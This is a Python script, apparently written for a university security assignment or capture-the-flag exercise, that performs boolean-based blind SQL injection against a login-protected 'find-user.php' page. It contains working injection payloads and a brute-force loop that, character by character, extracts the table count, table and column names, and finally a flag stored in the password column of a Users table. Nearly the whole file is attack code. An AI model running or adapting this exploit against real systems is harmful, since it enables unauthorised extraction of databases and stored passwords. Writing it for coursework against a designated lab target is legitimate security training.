import requests
import string
import time

#login auth payload
payload = {'user': 'katsuhidei', 'pass': 'katsuhidei'}
#login auth page
url_auth = 'http://assignment-hermes.unimelb.life/auth.php'
#url and ?username=
url_target = "http://assignment-hermes.unimelb.life/find-user.php"

#sql query true
sql = "katsuhidei"
#sql query to check number of table use .format(num=1) to change value
sql_table_num = "katsuhidei' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database()) = '{num}"
#sql query to check each table's name 
sql_table_name = "katsuhidei' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {index},1),1,{num}) = '{letter}"
#sql query to check column names for each tables
sql_column_name = "katsuhidei' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {index},1),1,{num}) = '{letter}"
#sql to find flag in column
sql_password_flag_num = "katsuhidei' AND (SELECT COUNT(*) FROM Users WHERE password LIKE '%Flag%') = '{num}"
sql_password_flag = "katsuhidei' AND SUBSTRING((SELECT password FROM Users WHERE password LIKE '%Flag%'),1,{num}) = '{letter}"



def makeRequest(url_target,sql,s):

    #set parameters
    params = {"username": sql}

    #make the request
    x = s.get(url = url_target,params = params)

    #remember response time
    time = x.elapsed.total_seconds()

    #return the content of the response & response time
    return x.text, time


#login session
with requests.Session() as s:
    
    #get auth
    s.post(url_auth, data=payload)


#-------------------------test----------------------------------------
    '''
    
    #meke the request for username
    response = makeRequest(url_target,sql,s)
    print(sql)
    print("returned text is \"" + response[0] + "\"")
    if response[0] == 'true':
        print("true!")
    #print("request elapsed time (second) is " + str(response[1]))
    '''
#-------------------------number of tables-----------------------------
    '''
    #make the request for number of table
    print('number of table testing')
    table_count=0
    #table_count = 3
    while True:
        response = makeRequest(url_target,sql_table_num.format(num=table_count),s)
        if response[0] == 'true':
            print(sql_table_num.format(num=table_count))
            print("there are " + str(table_count) + " tables")
            break
        elif table_count == 100:
            print("reached 100... stopping process...")
            break
        else:
            print(sql_table_num.format(num=table_count))
            print("returned text is \"" + response[0] + "\"")

        table_count = table_count + 1
        time.sleep(2)
    '''

#------------------------each table name--------------------------
    '''
    #make the request for each table's name
    print('table name testing')
    for index in range(0,3):
        letter = ""
        for num in range(1,30):
            if len(letter)+1 != num:
                print("error!\n\n")
                break
            for az in string.ascii_lowercase + string.ascii_uppercase:
                #print(sql_table_name.format(index=index,num=num,letter=letter+az))
                response = makeRequest(url_target,sql_table_name.format(index=index,num=num,letter=letter+az),s)
                if response[0] == 'true':
                    letter = letter + az
                    print("the name of table is \"" + letter + "\"")
                    break
                else:
                    print("waiting... " + az)
                time.sleep(2)
    '''


#------------------------column name testing--------------------

    '''
    #make the request for each column's name 
    print('column name testing')
    noColumn = False
    for table in ['Trainings','Users','testing']:
        for index in range(0,10):
            letter = ""
            if noColumn == True:
                noColumn = False
                break
            
            for num in range(1,30):
                
                for az in string.ascii_lowercase + string.ascii_uppercase:
                    #print(sql_column_name.format(table=table,index=index,num=num,letter=letter+az))
                    response = makeRequest(url_target,sql_column_name.format(table=table,index=index,num=num,letter=letter+az),s)
                    if response[0] == 'true':
                        letter = letter + az
                        print("the name of table is \"" + table + "\"")
                        print("the name of column is \"" + letter + "\"")
                        break
                    else:
                        print(table + " table waiting... " + az)
                    time.sleep(2)

                if num == 1 and len(letter) != num:
                    print("there may be no more column in this table\n\n")
                    noColumn = True
                    break

                if len(letter) != num:
                    print("the name of table is \"" + table + "\"")
                    print("the name of column is \"" + letter + "\"")
                    break

        
    '''
#------------------------count flag string----------------------------
    '''
    #make the request for flag string in password column in users
    print('count flag string')
    flag_count = 0
    while True:
        response = makeRequest(url_target,sql_password_flag_num.format(num=flag_count),s)
        if response[0] == 'true':
            print(sql_password_flag_num.format(num=flag_count))
            print("there are " + str(flag_count) + " flags string in password column in users tables")
            break
        elif flag_count == 10:
            print("reached 100... stopping process...")
            break
        else:
            print(sql_password_flag_num.format(num=flag_count))
            print("returned text is \"" + response[0] + "\"")

        flag_count = flag_count + 1
        time.sleep(2)
    '''

#-----------------------find flag--------------------------------

    #make the request for 
    print('finding flag')
    
    letter = ""
    noFlag = False
    for num in range(1,50):
        if noFlag == True:
            break
        for az in string.ascii_letters + string.digits + string.punctuation + string.whitespace:
            response = makeRequest(url_target,sql_password_flag.format(num=num,letter=letter+az),s)
            if response[0] == 'true':
                letter = letter + az
                print("the flag is \"" + letter + "\"")
                break
            else:
                print("waiting... " + az)
            time.sleep(2)
        if num == 1 and len(letter) != num:
            print("no Flag\n\n")
            noFlag = True
            break
        if len(letter) != num:
            print("the flag is \"" + letter + "\"")
            break


